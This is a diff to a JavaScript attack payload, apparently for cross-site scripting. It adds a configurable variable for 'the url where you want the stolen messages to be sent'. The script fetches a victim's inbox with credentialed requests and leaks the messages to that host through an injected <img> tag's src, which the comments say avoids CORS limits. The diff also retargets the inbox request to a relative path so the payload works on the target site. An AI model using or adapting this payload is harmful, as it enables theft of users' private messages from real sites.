@@ -1,6 +1,9 @@
+// The url where you want the stolen messages to be sent
+var remoteURL = 'http://localhost:1337/';
+
 // Compatible XHR object with credentials enabled.
 function newHttp(){
-    http = window.XMLHttpRequest? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
+    http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
     http.withCredentials = true;
     return http
 }
@@ -14,7 +17,7 @@ function DOM(html){
 // We can't use an XHR object due to CORS policies. (and attacker will probably need to send this cross-domain)
 // We'll add a <img> tag with the right src
 function send_msgs(){
-    var u = 'http://localhost:1337/'+encodeURIComponent(JSON.stringify(msgs,2,2));
+    var u = remoteURL+encodeURIComponent(JSON.stringify(msgs,2,2));
     var s = document.createElement('img');
     s.src = u;
     document.getElementsByTagName('body')[0].appendChild(s);
@@ -39,7 +42,7 @@ http.onreadystatechange = function() {
     };
 }
 
-http.open('GET', 'http://localhost:8080/user/messages/inbox', true); 
+http.open('GET', '../user/messages/inbox', true); 
 http.send();
 
 function fetch_message(i){
